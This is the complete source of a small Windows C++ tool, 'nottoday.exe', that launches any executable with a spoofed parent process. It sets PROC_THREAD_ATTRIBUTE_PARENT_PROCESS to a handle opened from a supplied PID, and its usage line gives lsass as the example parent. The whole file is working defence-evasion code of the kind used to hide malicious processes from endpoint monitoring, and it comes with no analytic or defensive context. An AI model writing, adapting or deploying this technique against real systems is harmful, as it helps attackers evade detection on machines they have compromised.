#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <stdio.h>

int main(int argc, char* argv[])
{
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	if (argc < 3) {
		printf("Usage: nottoday.exe <executable> <pid>\nExample: PS> nottoday.exe notepad.exe $(ps -name lsass).id\n");
		return 1;
	}
	int pid = atoi(argv[2]);
	printf("pid: %d", pid);
	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, pid);
	if (parentProcessHandle == INVALID_HANDLE_VALUE) {
		printf("Failed to get handle to process with pid: %d\n", pid);
	}
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	CreateProcessA(NULL, (LPSTR)argv[1], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

	return 0;
}